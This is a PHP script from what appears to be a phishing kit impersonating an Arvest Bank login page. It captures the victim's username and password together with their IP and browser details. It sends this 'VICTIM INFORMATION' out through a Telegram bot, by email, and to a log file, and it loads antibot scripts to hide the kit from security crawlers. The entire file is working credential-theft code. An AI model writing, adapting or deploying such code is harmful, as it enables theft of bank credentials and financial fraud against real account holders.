<?php

session_start();
date_default_timezone_set('GMT'); 
error_reporting(0);


include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');

include('../Antibot/blockers.php');
include('../Antibot/detects.php');

include('../config.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');
$TIME_DATE = date('H:i:s d/m/Y');


$_SESSION['_my_password_'] = $_POST['password'];

if (isset($_POST['password'])) {
	$Z118_MESSAGE .= "

		[ ARVEST BANK ACCOUNT LOGIN]
		[ SECOND USER LOGIN INFORMATION]

		[Username] = ".$_SESSION['first_userids']."
		[Password]    = ".$_POST['password']."

		--------------------------------------------------
		[VICTIM INFORMATION]

		[TIME/DATE]    = ".$TIME_DATE."
		[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
		[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
		[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
		[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."

		";


		if($send_results_to_telegram == "on") {
			$data = [
				'text' => ''.$Z118_MESSAGE.'',
				'chat_id' => ''.$chat_id.''
			];
			file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?" . http_build_query($data) );
		}
	
		if($save_results_to_cpanel == "on") {
			$res_file = fopen("../logs/Password.txt", "a");
			fwrite($res_file, $Z118_MESSAGE);
		}
	
		
		if($send_results_to_email == "on") {

			$Z118_MESSAGE .= "
			################ [ ARVEST LOGIN INFORMATION ] ####################
			±±±±±±±±±±±±±±±±±[ SECOND LOGIN INFORMATION ]±±±±±±±±±±±±±±±±±±±±
			
			[Username] = ".$_SESSION['first_userids']."
			[Password]    = ".$_POST['password']."

			±±±±±±±±±±±±±±±±[ VICTIM INFORMATION ]±±±±±±±±±±±±±±±±±±±

			[TIME/DATE]    = ".$TIME_DATE."
			[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
			[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
			[BROWSER] = ".Z118_Browser($_SERVER['HTTP_user_AGENT'])." On ".Z118_OS($_SERVER['HTTP_user_AGENT'])."
			[BROWSER] = ".$_SERVER['HTTP_user_AGENT']."
			##################[ BY @X_hammer ]#####################
			\n";

			$Z118_SUBJECT = "✪ LOGIN FROM : ✪ ".$_POST['userid']." ✪";
			$Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
			$Z118_HEADERS .= $_POST['userid']."\n";
			$Z118_HEADERS .= "MIME-Version: 1.0\n";
			$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
			@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
		}
	
		
		
		if($redirect_to_next_page == "on") {
			Header("Location: ../../security.php");
		}
	
}

?>